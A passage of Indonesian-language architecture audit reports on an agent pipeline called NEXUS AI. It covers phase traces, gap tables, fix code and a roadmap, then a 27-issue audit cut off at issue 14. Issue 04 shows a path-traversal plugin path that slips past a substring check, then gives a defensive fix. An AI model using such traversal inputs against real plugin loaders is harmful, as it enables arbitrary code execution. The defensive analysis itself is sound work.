    // truncated — tapi apakah ada handling?
}
```
**Dampak:** Konteks yang paling penting (bagian akhir prompt, instruksi spesifik) mungkin terpotong secara diam-diam. LLM menghasilkan output yang tidak sesuai ekspektasi tanpa error yang jelas.

---

### 🟡 SEDANG-6: `KnowledgePhase.harvest()` Sumber Data Seringkali Kosong
**File:** `agent/core/phases/KnowledgePhase.js`  
**Kondisi:** Harvest mencari folder `memory/operational`, `docs/summary`, `nexus/knowledge`, dll. di dalam sandbox. Tapi sandbox 'crud' yang di-spawn `EvolutionPiper` hanya berisi 4 file stub. Tidak ada folder `memory/` yang pernah dibuat di dalam sandbox.

**Dampak:** `filesHarvested = 0` hampir selalu terjadi. Tidak ada knowledge yang masuk ke HUB. Memory inti NEXUS tidak berkembang dari pengalaman sandbox.

---

### 🟡 SEDANG-7: `docker-compose.yml` Tidak Mount `nexus/native/`
**File:** `docker-compose.yml`  
**Kondisi:**
```yaml
volumes:
  - ./memory:/app/memory
  - ./documentation:/app/documentation
  - ./agent/prompts:/app/agent/prompts
  # nexus/native/ TIDAK di-mount
```
**Dampak:** Binary C++ (`sandbox_orchestrator`) tidak tersedia di dalam container. `NativeBridge.callCpp()` selalu throw "binary not found".

---

### 🟢 MINOR-8: Cycle Counter Tidak Thread-Safe untuk Multi-Instance
**File:** `agent/core/EvolutionPiper.js`  
**Kondisi:** Persistensi cycle ke `.evolution_state.json` tidak menggunakan atomic lock. Jika dua proses NEXUS berjalan bersamaan, mereka bisa membaca nilai lama dan sama-sama increment ke nilai yang sama.

---

### 🟢 MINOR-9: `NexusError` Terlalu Minimal (353 bytes)
**File:** `agent/core/NexusError.js`  
**Kondisi:** Tidak ada error codes, tidak ada severity levels, tidak ada stack enrichment. 30+ komponen throw error dengan format message yang berbeda-beda.

---

## 5. Audit Ekstrem: Sandbox Pipeline End-to-End

Berikut tracing lengkap jalur eksekusi dari `nexus run` hingga output, berdasarkan pembacaan source code aktual:

### 5.1 Entry Point
```
cli.js
  └─► NexusEngine.constructor()
        ├─ resolve paths (auditPath, logPath, planningPath, ...)
        ├─ new Modifier(), new MemoryPipeline(), new TDDGuard()
        ├─ new Orchestrator(), new EvolutionPiper()
        ├─ new LocalIntelligence(), new SemanticEngine()
        └─ new Distiller()
```

### 5.2 Phase 1: AuditPhase
```
AuditPhase.run(targetPath)
  ├─ Scan 6 standard Nexus folders → WARNING jika missing
  ├─ Cek README.md, .env, LICENSE
  └─ ParallelRunner (concurrency=2):
        ├─ cyber-security scanner
        ├─ ux-engineer scanner
        ├─ seo-performance-specialist scanner
        ├─ database-architect scanner
        ├─ vcs-architect scanner
        └─ documentation-architect scanner
        ▼ setiap scanner: SandboxExecutor.execute(scannerPath)
             └─ Worker Thread (plugin-worker.js)
                  └─ require(scannerPath)(targetPath)
                  └─ result → message → resolve
        ▼
        Tulis: memory/raw/report_{spec}_{auditID}.json
```

**⚠️ Gap Ditemukan:** Scanner berjalan di Worker Thread tapi `timeout = 30000ms` default. Scanner yang berat (database-architect melakukan recursive file scan) bisa timeout sebelum selesai pada project besar.

### 5.3 Phase 2: PlanningPhase
```
PlanningPhase.run(auditReport)
  ├─ Filter findings (hilangkan INFO)
  ├─ Map findings → tasks (dengan auto-action untuk kasus sederhana)
  │    Contoh: '.env detected' → task.action = FILE_APPEND(.gitignore)
  └─ Tulis: planning/plan_{planID}.json + plan_{planID}.md
```

**⚠️ Gap Ditemukan:** Auto-action hanya mencakup satu kasus (`.env detected`). Mayoritas findings tidak punya `task.action`, sehingga ExecutionPhase tidak melakukan modifikasi fisik apapun untuk temuan tersebut. Plan dibuat tapi tidak dieksekusi secara nyata.

### 5.4 Phase 2.5: ImplementationPhase
```
ImplementationPhase.run()
  ├─ Baca NEXUS_BLUEPRINT.json
  ├─ Untuk setiap model → LocalIntelligence.generate(prompt, 'build_model_migration')
  │    └─ Ollama HTTP POST /api/generate
  │    └─ Tulis: app/Models/{Model}.php
  ├─ Untuk setiap migration → generate + tulis ke database/migrations/
  └─ Untuk setiap Livewire component:
        ├─ generate PHP class → app/Livewire/{Class}.php
        └─ generate Blade view → resources/views/livewire/{name}.blade.php
```

**🔴 Gap Kritis:** Tidak ada langkah `composer install`, `php artisan migrate`, `php artisan key:generate`, atau `npm run build`. File dihasilkan tapi aplikasi tidak bisa dijalankan.

### 5.5 Phase 3: ExecutionPhase
```
ExecutionPhase.run(plan)
  ├─ Untuk setiap task dengan task.action:
  │    ├─ Jika FILE_REPLACE/FILE_APPEND → TDDGuard.validate()
  │    │    └─ Jika tidak ada test → TDDScaffolder.generate()
  │    ├─ Jika ASSET_OPTIMIZE → AssetEngine.process()
  │    └─ Else → Modifier.apply(task.action)
  │         ├─ FILE_REPLACE: baca file, replace konten, tulis kembali
  │         ├─ FILE_APPEND: append ke akhir file
  │         ├─ FILE_CREATE: buat file baru
  │         └─ RESOLVE_OPTIONS: handle collision markers
  └─ ExecutionPhase.verify(plan)
        └─ Validator.verifyAction(task.action) untuk setiap task done
```

**⚠️ Gap Ditemukan:** `cleanCodeAndVerify()` mencari `NEXUS_BLUEPRINT.json` untuk mendapatkan `legacy_patterns`. Jika blueprint tidak ada (yang terjadi pada sandbox baru), method ini membuat `legacyPatterns = []` dan tidak membersihkan apapun. Tidak ada error, tapi juga tidak ada verifikasi real.

### 5.6 Phase 5: KnowledgePhase (Memory Internalization)
```
KnowledgePhase.run()
  ├─ memoryPipeline.optimize()
  │    ├─ archiveAuditReports() → pindah JSON audit ke memory/archived/
  │    ├─ archiveImplementationPlans() → pindah JSON plan ke archived/
  │    ├─ processHarvestData()
  │    │    └─ Baca golden/harvest/{project}/**/*.md
  │    │    └─ Merge/deduplicate ke memory/distilled/
  │    └─ writeSemanticIndex() → buat NEXUS_INDEX.md
  └─ distiller.run()
        ├─ standardizeNames() → prefix NEXUS_ pada semua file HUB
        ├─ simplifyContent() → summarize file panjang via LLM
        └─ applySemanticLinking() → tambah cross-references antar file
```

**🔴 Gap Kritis:** `KnowledgePhase.harvest(sourcePath)` harus dipanggil secara eksplisit SETELAH sandbox selesai dibangun. Tidak ada mekanisme otomatis yang memastikan harvest dipanggil di akhir setiap sandbox lifecycle. Jika tidak dipanggil, `processHarvestData()` menemukan `golden/harvest/` kosong dan tidak ada yang diproses.

---

## 6. Gap Analysis: "Web App yang Bisa Digunakan"

Definisi "web app yang bisa digunakan": aplikasi yang dapat diakses melalui browser, memiliki UI, koneksi database, dan fungsionalitas dasar.

| Komponen | Status | Kondisi Aktual |
|---|---|---|
| File PHP (Model, Controller, Routes) | ✅ Dibuat | `ImplementationPhase` menulis file via LLM |
| Blade Views | ✅ Dibuat | `ImplementationPhase` menulis Blade templates |
| `composer install` | ❌ Tidak ada | Tidak pernah dipanggil |
| `vendor/` directory | ❌ Tidak ada | Autoload tidak tersedia |
| Database migration | ❌ Tidak ada | `php artisan migrate` tidak pernah dipanggil |
| APP_KEY | ⚠️ Parsial | Ada di `.env` tapi `artisan key:generate` tidak dipanggil |
| Compiled CSS/JS | ❌ Tidak ada | `npm run build` tidak pernah dipanggil |
| Dev server | ❌ Tidak ada | `php artisan serve` tidak pernah dipanggil |
| **Hasil Akhir** | ❌ **Tidak Bisa Digunakan** | Kumpulan file PHP tanpa runtime |

**Kesimpulan:** Saat ini NEXUS AI menghasilkan *scaffold* file PHP, bukan *web app yang berjalan*. Gap utama ada di antara "file dihasilkan" dan "aplikasi dijalankan".

---

## 7. Gap Analysis: "Memory Inti Nexus"

Definisi "memory inti": pengalaman, dokumentasi, dan knowledge dari tiap sandbox tersimpan permanen dan dapat diakses untuk project berikutnya.

| Komponen | Status | Kondisi Aktual |
|---|---|---|
| Audit reports ke disk | ✅ Berjalan | `AuditPhase` menulis JSON ke `memory/raw/` |
| Plan ke disk | ✅ Berjalan | `PlanningPhase` menulis JSON + MD ke `planning/` |
| MemoryPipeline archiving | ✅ Berjalan | Archive audit/plan ke `memory/archived/` |
| Distiller standardization | ✅ Berjalan | Prefix NEXUS_ pada file HUB |
| KnowledgePhase harvest | ⚠️ Parsial | Berjalan hanya jika dipanggil eksplisit |
| Harvest source (sandbox docs) | ❌ Kosong | Sandbox 'crud' tidak menghasilkan docs |
| Redis vector memory | ❌ Tidak aktif | Service tidak ada di docker-compose |
| LLM semantic linking | ⚠️ Parsial | Berjalan tapi sumber data minimal |
| **Hasil Akhir** | ⚠️ **Parsial** | Metadata tersimpan, knowledge tidak tumbuh |

**Kesimpulan:** Memory pipeline sudah terstruktur dengan baik, tapi "pakan" (knowledge dari sandbox) tidak mengalir karena sandbox tidak menghasilkan dokumentasi dan harvest tidak dipanggil otomatis.

---

## 8. Rekomendasi Perbaikan Prioritas

### R-01: Implementasikan `spawnRealLaravel()` [KRITIS]
Ganti throw Error dengan implementasi nyata:

```javascript
async spawnRealLaravel(name) {
    await this.checkEvolutionBoundary();
    const targetPath = path.join(this.sandboxPath, name);
    
    // Step 1: composer create-project
    await this._spawn('composer', [
        'create-project', 'laravel/laravel', name, '--no-interaction'
    ], { cwd: this.sandboxPath, timeout: 300000 });

    // Step 2: Install TALL Stack
    await this._spawn('composer', [
        'require', 'livewire/livewire', 'laravel/sanctum'
    ], { cwd: targetPath, timeout: 120000 });

    // Step 3: Tailwind + Alpine via npm
    await this._spawn('npm', ['install'], { cwd: targetPath, timeout: 120000 });

    return targetPath;
}
```

### R-02: Tambah Post-Implementation Runner [KRITIS]
Di akhir `ImplementationPhase.run()`, tambahkan:

```javascript
async bootstrapApplication() {
    const root = this.engine.rootPath;
    
    await this._run('composer', ['install', '--no-interaction'], root);
    await this._run('php', ['artisan', 'key:generate', '--force'], root);
    await this._run('php', ['artisan', 'migrate', '--force', '--seed'], root);
    await this._run('npm', ['install'], root);
    await this._run('npm', ['run', 'build'], root);
    
    this.log('✅ Application bootstrapped and ready.', 'success');
}
```

### R-03: Tambah Redis ke `docker-compose.yml` [KRITIS]
```yaml
services:
  redis:
    image: redis:7-alpine
    container_name: nexus_redis
    restart: unless-stopped
    networks:
      - nexus-internal
    volumes:
      - redis_data:/data

  nexus-ai:
    # ...existing config...
    depends_on:
      - redis
    environment:
      - REDIS_URL=redis://redis:6379

volumes:
  redis_data:
```

### R-04: Aktifkan `WorktreeManager` [KRITIS]
Ubah `isActive = true` setelah menambahkan error handling:

```javascript
this.isActive = process.env.NEXUS_GIT_ISOLATION === 'true';
```

Dan tambahkan di `.env`:
```
NEXUS_GIT_ISOLATION=true
```

### R-05: Auto-Trigger KnowledgePhase Harvest [SEDANG]
Di `EvolutionPiper.harvestWisdom()`, setelah copy logs, tambahkan trigger:

```javascript
async harvestWisdom(name) {
    // ... existing harvest logic ...
    
    // Auto-trigger KnowledgePhase untuk internalisasi
    const knowledgePhase = new KnowledgePhase(this.engine);
    await knowledgePhase.harvest(targetPath);
    await knowledgePhase.run(); // distill ke HUB
    
    console.log(`✅ Knowledge from [${name}] internalized to NEXUS core memory.`);
}
```

### R-06: Implementasikan Sandbox Documentation Writer [SEDANG]
Di akhir setiap sandbox build, generate dokumentasi yang menjadi "pakan" harvest:

```javascript
async generateSandboxDocumentation(targetPath, buildResult) {
    const docsPath = path.join(targetPath, 'nexus', 'memory', 'operational');
    await fs.ensureDir(docsPath);
    
    const doc = `# Sandbox Build Report
**Project:** ${path.basename(targetPath)}
**Date:** ${new Date().toISOString()}
**Status:** ${buildResult.success ? 'SUCCESS' : 'FAILED'}

## Files Generated
${buildResult.files.map(f => `- ${f}`).join('\n')}

## Lessons Learned
${buildResult.lessons.join('\n')}
`;
    await fs.writeFile(path.join(docsPath, 'BUILD_REPORT.md'), doc);
}
```

### R-07: Mount Native Binary di Docker [MINOR]
Tambahkan ke `docker-compose.yml`:
```yaml
volumes:
  - ./nexus/native:/app/nexus/native
```

### R-08: Perluas `NexusError` dengan Error Codes [MINOR]
```javascript
class NexusError extends Error {
    constructor(domain, message, code = 'NEXUS_UNKNOWN') {
        super(`[${domain}] ${message}`);
        this.code = code;
        this.domain = domain;
        this.timestamp = new Date().toISOString();
    }
}

// Usage:
throw new NexusError('EXECUTION', 'Binary not found', 'NEXUS_E001_BINARY_NOT_FOUND');
```

---

## 9. Peta Jalan (Roadmap)

### Fase A — Foundation Fix (1-2 minggu)
Fokus: Pipeline menghasilkan aplikasi yang bisa dibuka di browser.

1. Implementasikan `spawnRealLaravel()` dengan composer
2. Tambahkan `bootstrapApplication()` di akhir ImplementationPhase
3. Fix `docker-compose.yml` (Redis + volume native)
4. Aktifkan `WorktreeManager` via env flag

**Kriteria sukses:** `nexus run` → `php artisan serve` → browser menampilkan halaman Laravel

### Fase B — Knowledge Loop (2-3 minggu)
Fokus: Setiap sandbox build memperkaya memory inti NEXUS.

1. Implementasikan Sandbox Documentation Writer
2. Auto-trigger KnowledgePhase.harvest() di akhir setiap sandbox
3. Sambungkan Redis sebagai vector store yang aktif
4. Verifikasi distiller berjalan setelah setiap harvest

**Kriteria sukses:** Setelah 3 sandbox selesai, `memory/distilled/` memiliki knowledge yang terstruktur dari ketiga project

### Fase C — Quality & Scale (3-4 minggu)
Fokus: Stabilitas untuk 100 project target.

1. Implementasikan atomic Redis counter untuk EvolutionPiper
2. Implementasikan chunking untuk prompt >30KB
3. Perluas NexusError dengan error codes
4. Tambahkan health-check startup (python, C++, Redis, Ollama)
5. Implementasikan ConcurrencyGovernor global

**Kriteria sukses:** `nexus run` berhasil pada 10 project berturut-turut tanpa crash atau data corruption

---

*Dokumen ini dihasilkan berdasarkan analisis source code langsung dari file: `NexusEngine.js`, `Orchestrator.js`, `EvolutionPiper.js`, `Distiller.js`, `NativeBridge.js`, `SandboxExecutor.js`, `LocalIntelligence.js`, `WorktreeManager.js`, `MemoryPipeline.js`, `KnowledgePhase.js`, `ExecutionPhase.js`, `ImplementationPhase.js`, `PlanningPhase.js`, `AuditPhase.js`, `docker-compose.yml`, `package.json`.*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_AI_ARCHITECTURE_AUDIT.MD

# NEXUS AI — Architecture Audit Report
> **VERSION**: v1 | **Last Updated**: 26/05/2026


**Version:** 3.3.0  
**Auditor:** AI Engineering Review  
**Tanggal:** 16 Mei 2026  
**Cakupan:** Seluruh `agent/core/`, `agent/phases/`, `agent/tools/`, `agent/main.js`, `.github/`, `.env`

---

## Ringkasan Eksekutif

Proyek NEXUS AI memiliki fondasi arsitektur yang solid: EventBus schema-validated, Dead Letter Queue di Orchestrator, guardrail whitelist di LocalIntelligence, versioned write di MemoryPipeline, dan circuit-aware ResourceMonitor. Namun setelah audit menyeluruh terhadap **27 file core**, ditemukan **27 isu** yang terdiri dari bug aktif, potensi crash, celah keamanan, dan technical debt yang perlu diselesaikan sebelum roadmap 100-project dapat berjalan stabil.

---

## Indeks Isu

| No | Komponen | Kategori | Severity |
|----|----------|----------|----------|
| 01 | `LocalIntelligence` | Prompt OOM | 🔴 Critical |
| 02 | `Orchestrator.executeTask` | Hanging Promise | 🔴 Critical |
| 03 | `NativeBridge` | Cross-platform | 🔴 Critical |
| 04 | `SandboxExecutor` | Security | 🔴 Critical |
| 05 | `RedisMemory` | Data Loss | 🔴 Critical |
| 06 | `Logger` | Data Corruption | 🔴 Critical |
| 07 | `NexusEngine` | God Object | 🟠 High |
| 08 | `LocalIntelligence` | Race Condition | 🟠 High |
| 09 | Ollama / LocalIntelligence | No Circuit Breaker | 🟠 High |
| 10 | `EventBus` | Memory Leak | 🟠 High |
| 11 | `AgentRegistry` | Not Wired | 🟠 High |
| 12 | `EvolutionPiper` | State Lost on Crash | 🟠 High |
| 13 | `WorktreeManager` | Blocking Event Loop | 🟠 High |
| 14 | `AuditPhase` | No Concurrency Limit | 🟠 High |
| 15 | `SemanticEngine` | NaN Corruption | 🟠 High |
| 16 | `RedisMemory` | Lazy Connect Bug | 🟠 High |
| 17 | `NexusEngine.runCycle` | No Global Timeout | 🟡 Medium |
| 18 | `EventBus` | Aggressive Dedup | 🟡 Medium |
| 19 | `MemoryPipeline` vs `SemanticEngine` | Duplicate Index | 🟡 Medium |
| 20 | `MemoryGovernor` vs `MemoryPipeline` | Overlapping Ownership | 🟡 Medium |
| 21 | `Contract.js` | Timestamp Inconsistency | 🟡 Medium |
| 22 | `ExecutionPhase` | Hardcoded Legacy Patterns | 🟡 Medium |
| 23 | `main.js` | Duplicate Orchestrator | 🟡 Medium |
| 24 | `EvolutionPiper.spawnRealLaravel` | Dead Code | 🟡 Medium |
| 25 | `Distiller` | Unused NativeBridge Instance | 🟡 Medium |
| 26 | `ExecutionPhase.getAvailablePort` | Unbounded Recursion | 🟡 Medium |
| 27 | `ci.yml` + `.env` | Security & CI Gap | 🟡 Medium |

---

## Detail Isu

---

### 🔴 01 — Prompt Files ~2MB Per File → OOM pada 7B Model

**File:** `agent/prompts/internal/guru.md`, `orchestrator.md`, `pipeline-architect.md`  
**Ukuran:** Masing-masing ~2MB  

**Masalah:**  
`LocalIntelligence.generate()` menggunakan `num_ctx: 4096` token dan model `qwen2.5-coder:7b-instruct-q4_K_M`. Prompt 2MB setara ±500k token — jauh melampaui context window. Ollama akan truncate atau crash dengan OOM. Pada mesin 8GB RAM yang dishare dengan Vega 8, ini hampir pasti fatal.

**Dampak:** Engine crash sebelum menghasilkan output apapun.

**Solusi:**
```
agent/prompts/internal/orchestrator/
  ├── core.md          (~30KB - instruksi inti + persona)
  ├── planning.md      (~20KB - hanya diload saat fase planning)
  ├── execution.md     (~20KB - hanya diload saat fase execution)
  └── recovery.md      (~10KB - error handling)
```

Di `LocalIntelligence.generate()`, pilih sub-prompt berdasarkan `taskType`, bukan satu file monolitik.

---

### 🔴 02 — `Orchestrator.executeTask`: Promise Tanpa Timeout → Hanging Forever

**File:** `agent/core/Orchestrator.js`  

**Masalah:**
```js
return new Promise((resolve, reject) => {
    EventBus.subscribe('SCANNER_FINISHED', onFinished);
    EventBus.subscribe('TASK_FAILED', onFailed);
    EventBus.publish('SCANNER_TRIGGERED', { ... });
    // ⚠️ Jika event tidak pernah fire → Promise nangkring selamanya
    // Tidak ada setTimeout, tidak ada cleanup
});
```

Jika Ollama crash atau plugin exit tanpa mengirim pesan, Promise tidak pernah resolve/reject. Ini menyebabkan `AuditPhase.run()` hang selamanya dan seluruh cycle tidak pernah selesai.

**Dampak:** Engine deadlock permanen.

**Solusi:**
```js
const timeout = setTimeout(() => {
    EventBus.unsubscribe('SCANNER_FINISHED', onFinished);
    EventBus.unsubscribe('TASK_FAILED', onFailed);
    reject(new Error(`Task ${taskId} timed out after ${task.timeout_ms}ms`));
}, task.timeout_ms || 30000);

// Tambahkan clearTimeout(timeout) di onFinished dan onFailed
```

---

### 🔴 03 — `NativeBridge.callCpp`: Hardcode `.exe` → Gagal di Docker/Linux

**File:** `agent/core/NativeBridge.js`

**Masalah:**
```js
const fullPath = path.join(this.binPath,
    binaryName.endsWith('.exe') ? binaryName : `${binaryName}.exe`
);
```

`docker-compose.yml` ada di repo, artinya proyek ini dirancang untuk jalan di Linux container. Tapi `NativeBridge` selalu mencari `.exe` — binary Linux tidak punya extension ini. Setiap panggilan ke C++ module akan throw `binary not found`.

**Dampak:** Seluruh NativeBridge layer non-functional di Docker.

**Solusi:**
```js
const ext = process.platform === 'win32' ? '.exe' : '';
const fullPath = path.join(this.binPath, `${binaryName}${ext}`);
```

Tambahkan juga timeout untuk spawn process agar tidak hang:
```js
const timer = setTimeout(() => { proc.kill(); reject(new Error('C++ timeout')); }, 60000);
proc.on('close', () => clearTimeout(timer));
```

---

### 🔴 04 — `SandboxExecutor`: Path Traversal via Substring Check

**File:** `agent/core/SandboxExecutor.js`

**Masalah:**
```js
const isAllowed = manifest.scanners.some(s => pluginPath.includes(s.entrypoint));
```

Pengecekan ini adalah **substring match**, bukan path normalization. Path berikut akan **lolos** validasi:
```
../../malicious/cyber-security.js   ← includes "cyber-security.js" ✓ (SALAH LOLOS)
```

Selain itu, manifest dibaca dengan `readJsonSync` di dalam Promise — memblok event loop.

**Dampak:** Arbitrary code execution jika attacker bisa memanipulasi `pluginPath`.

**Solusi:**
```js
const allowedDir = path.resolve(path.join(__dirname, '..', 'tools', 'scanners'));
const resolvedPlugin = path.resolve(pluginPath);

if (!resolvedPlugin.startsWith(allowedDir)) {
    return reject(new Error(`SandboxExecutor: Plugin path not in allowed directory`));
}

// Gunakan fs.readJson async
const manifest = await fs.readJson(manifestPath);
const isAllowed = manifest.scanners.some(s =>
    resolvedPlugin === path.resolve(path.join(allowedDir, s.entrypoint))
);
```

---

### 🔴 05 — `RedisMemory.flush()` Memanggil `flushAll()` → Menghapus Seluruh Redis

**File:** `agent/core/RedisMemory.js`

**Masalah:**
```js
async flush() {
    if (!this.isConnected) return;
    await this.client.flushAll();  // ⚠️ Hapus SEMUA data di Redis
}
```

`flushAll()` menghapus **semua database** di Redis server, bukan hanya key milik NEXUS. Jika Redis dishare dengan Laravel app (sessions, cache, queue), maka saat `nexus distill` dipanggil, seluruh data Laravel ikut terhapus — termasuk user sessions yang aktif.

**Dampak:** Data loss pada aplikasi lain yang berbagi Redis server.

**Solusi:** Gunakan namespace prefix dan hapus hanya key NEXUS:
```js
const NEXUS_PREFIX = 'nexus:';

async flush() {
    if (!this.isConnected) return;
    const keys = await this.client.keys(`${NEXUS_PREFIX}*`);
    if (keys.length > 0) {
        await this.client.del(keys);
    }
}

async set(key, value, expirySeconds = 3600) {
    const namespacedKey = `${NEXUS_PREFIX}${key}`;
    // ... gunakan namespacedKey
}
```

---

### 🔴 06 — `Logger._writeQueue` Dideklarasikan Tapi Tidak Digunakan → Race Condition

**File:** `agent/core/Logger.js`

**Masalah:**
```js
constructor(rootPath) {
    // ...
    this._writeQueue = Promise.resolve(); // ← dideklarasikan
}

async log(...) {
    // ...
    await fs.appendFile(logFile, JSON.stringify(logEntry) + '\n'); // ← tidak melalui _writeQueue
}
```

`this._writeQueue` ada tapi tidak pernah digunakan. Dengan 6 specialist agent berjalan paralel, semuanya bisa `appendFile` ke file `.ndjson` yang sama secara bersamaan. Di Node.js, concurrent `appendFile` ke file yang sama **tidak atomic** — baris JSON bisa terinterleave menghasilkan log yang corrupt.

**Dampak:** Log file corrupt, audit trail tidak dapat diandalkan.

**Solusi:**
```js
async log(...args) {
    this._writeQueue = this._writeQueue.then(() => this._doLog(...args));
    return this._writeQueue;
}

async _doLog(category, level, agent, task_id, event, message, ...) {
    // ... logika appendFile yang sudah ada
}
```

---

### 🟠 07 — `NexusEngine` adalah God Object: 20+ Dependency di Constructor

**File:** `agent/core/NexusEngine.js`

**Masalah:**
Constructor langsung menginstansiasi: `Modifier`, `MemoryPipeline`, `TDDGuard`, `TDDScaffolder`, `AssetEngine`, `Validator`, `BugHunter`, `Designer`, `AccessibilityScanner`, `SchemaGuard`, `QueryOptimizer`, `WorktreeManager`, `RootCauseAnalyzer`, `Machinist`, `Distiller`, `EvolutionPiper`, `DecisionEngine`, `ParallelRunner`, `NativeBridge`, `Orchestrator`, `ResourceMonitor`. Semua diinstansiasi tanpa kondisi, bahkan yang jarang dipakai.

**Dampak:** Memory overhead tinggi sejak startup; unit testing hampir mustahil tanpa mocking seluruh tree.

**Solusi:** Lazy initialization untuk komponen jarang dipakai:
```js
// Ganti: this.designer = new Designer();
get designer() {
    if (!this._designer) this._designer = new Designer();
    return this._designer;
}

// Komponen yang perlu lazy: NativeBridge, Designer, AccessibilityScanner,
// QueryOptimizer, WorktreeManager, EvolutionPiper
```

---

### 🟠 08 — `LocalIntelligence` Singleton dengan `isAvailable` Mutable → Race Condition

**File:** `agent/core/LocalIntelligence.js`

**Masalah:**
```js
module.exports = new LocalIntelligence(); // ← singleton
// this.isAvailable = false (mutable state)
```

Dengan `ParallelRunner` limit=3, tiga concurrent task bisa memanggil `generate()` bersamaan. Semua berbagi `this.isAvailable` yang sama — satu goroutine bisa mengubahnya di tengah pengecekan goroutine lain.

**Dampak:** Task bisa melewati pengecekan availability lalu fail di tengah jalan.

**Solusi:** Caching TTL untuk availability check:
```js
this._availabilityCache = { value: false, expiresAt: 0 };

async checkAvailability() {
    if (Date.now() < this._availabilityCache.expiresAt) {
        return this._availabilityCache.value;
    }
    try {
        // ... actual check
        this._availabilityCache = { value: true, expiresAt: Date.now() + 60000 };
        return true;
    } catch {
        this._availabilityCache = { value: false, expiresAt: Date.now() + 10000 };
        return false;
    }
}
```

---

### 🟠 09 — Ollama Tanpa Circuit Breaker → Death Spiral saat Overload

**File:** `agent/core/LocalIntelligence.js`

**Masalah:**
Tidak ada circuit breaker. Jika Ollama overload atau crash, tiap `generate()` menunggu hingga timeout, kemudian retry. Dengan 3 concurrent workers × 3 retry = 9 request menumpuk. CPU + RAM meledak.

**Dampak:** Cascade failure seluruh engine saat model overload.

**Solusi — State machine sederhana:**
```js
this.cb = { state: 'CLOSED', failures: 0, openedAt: null };

async generate(prompt, taskType) {
    if (this.cb.state === 'OPEN') {
        if (Date.now() - this.cb.openedAt < 30000) return null; // fail fast
        this.cb.state = 'HALF-OPEN';
    }
    try {
        const result = await this._doGenerate(prompt, taskType);
        this.cb = { state: 'CLOSED', failures: 0, openedAt: null };
        return result;
    } catch (e) {
        this.cb.failures++;
        this.cb.openedAt = Date.now();
        if (this.cb.failures >= 3) this.cb.state = 'OPEN';
        return null;
    }
}
```

---

### 🟠 10 — `EventBus`: Subscription Listener Tidak Pernah Dibersihkan → Memory Leak

**File:** `agent/core/EventBus.js`, `agent/core/Orchestrator.js`

**Masalah:**
`setupEventHandlers()` di Orchestrator mendaftarkan listener permanent untuk `SCANNER_TRIGGERED`, `TASK_FAILED`, dan `CYCLE_FINISHED`. Listener ini tidak pernah dihapus. Di lingkungan long-running (100 project cycle), listener menumpuk di EventEmitter.

`setMaxListeners(50)` hanya menekan warning, bukan solusi kebocoran.

**Dampak:** Memory leak progresif; performa menurun setelah banyak cycle.

**Solusi:** Tracking listener dan cleanup method:
```js
this._handlers = [];

_subscribe(event, fn) {
    EventBus.subscribe(event, fn);
    this._handlers.push({ event, fn });
}

destroy() {
    this._handlers.forEach(({ event, fn }) => EventBus.unsubscribe(event, fn));
    this._handlers = [];
}
```

---

### 🟠 11 — `AgentRegistry` Tidak Terhubung ke `Orchestrator` → Selalu Kosong

**File:** `agent/core/AgentRegistry.js`, `agent/core/Orchestrator.js`

**Masalah:**
`AgentRegistry` menyediakan `markBusy()`, `markIdle()`, `markFailed()`, dan `getStuckAgents()`. Tapi di `Orchestrator.setupEventHandlers()`, tidak ada satu pun panggilan ke registry:
```js
// Orchestrator.js — TIDAK ada:
// agentRegistry.markBusy(agentId, taskId);
// agentRegistry.markIdle(agentId);
```

`NexusEngine.getSystemStatus()` memanggil `agentRegistry.getHealthReport()` tapi selalu menghasilkan `{ total: 0, idle: 0, busy: 0 }` karena tidak ada yang pernah mendaftar.

**Dampak:** Stuck agent detection tidak berfungsi. Monitoring buta.

**Solusi:** Tambahkan di dalam `SCANNER_TRIGGERED` handler:
```js
EventBus.subscribe('SCANNER_TRIGGERED', async (payload) => {
    agentRegistry.markBusy(payload.agent, taskId);
    // ... existing logic
});

// Setelah task selesai:
agentRegistry.markIdle(payload.agent);
// Jika fail:
agentRegistry.markFailed(payload.agent, err.message);
```

---

### 🟠 12 — `EvolutionPiper.currentCycle` In-Memory → Reset saat Crash

**File:** `agent/core/EvolutionPiper.js`

**Masalah:**
```js
this.currentCycle = 0; // hanya ada di memory
```

Jika engine crash di cycle ke-23, saat restart `currentCycle` kembali ke 0. Guardrail `MAX_EVOLUTION_CYCLES = 25` menjadi tidak efektif — sistem bisa menjalankan jauh lebih dari 25 cycle sebenarnya.

**Dampak:** Guardrail bypass; resource exhaustion tanpa batas.

**Solusi:** Persist counter ke disk:
```js
async loadCycleState() {
    const statePath = path.join(this.rootPath, 'nexus', '.evolution_state.json');
    if (await fs.pathExists(statePath)) {
        const state = await fs.readJson(statePath);
        this.currentCycle = state.currentCycle || 0;
        this.sessionStartTime = state.sessionStartTime || null;
    }
}

async persistCycleState() {
    const statePath = path.join(this.rootPath, 'nexus', '.evolution_state.json');
    await fs.writeJson(statePath, {
        currentCycle: this.currentCycle,
        sessionStartTime: this.sessionStartTime
    });
}
```

---

### 🟠 13 — `WorktreeManager.finalize()` Menggunakan `execSync` → Memblok Event Loop

**File:** `agent/core/WorktreeManager.js`

**Masalah:**
```js
execSync(`git checkout main && git merge feature/${featureName}`, { cwd: this.rootPath });
```

`execSync` memblok seluruh Node.js event loop. Jika git mengalami merge conflict, network issue, atau repository besar, seluruh engine freeze selama operasi berlangsung — tidak ada timeout, tidak ada escape.

**Dampak:** Engine freeze total selama git operations.

**Solusi:** Gunakan `spawn` dengan Promise wrapper (sudah ada pola ini di `NativeBridge`):
```js
const { spawn } = require('child_process');

async _execGit(args, cwd, timeoutMs = 30000) {
    return new Promise((resolve, reject) => {
        const proc = spawn('git', args, { cwd, shell: false });
        let out = '', err = '';
        const timer = setTimeout(() => { proc.kill(); reject(new Error('Git timeout')); }, timeoutMs);
        proc.stdout.on('data', d => out += d);
        proc.stderr.on('data', d => err += d);
        proc.on('close', code => {
            clearTimeout(timer);
            code === 0 ? resolve(out.trim()) : reject(new Error(err));
        });
    });
}
```

---

### 🟠 14 — `AuditPhase`: 6 Scanner Berjalan Bersamaan Tanpa Concurrency Limit

**File:** `agent/core/phases/AuditPhase.js`

**Masalah:**
```js
const auditPromises = specialists.map(async (spec) => {
    // Spawn Worker + Ollama call per specialist
});
await Promise.all(auditPromises); // 6 concurrent Workers + Ollama
```

Enam Workers berjalan sekaligus, masing-masing berpotensi memanggil Ollama. Pada 8GB RAM dengan Vega 8 shared, ini cukup untuk menyebabkan OOM killer melakukan terminasi proses.

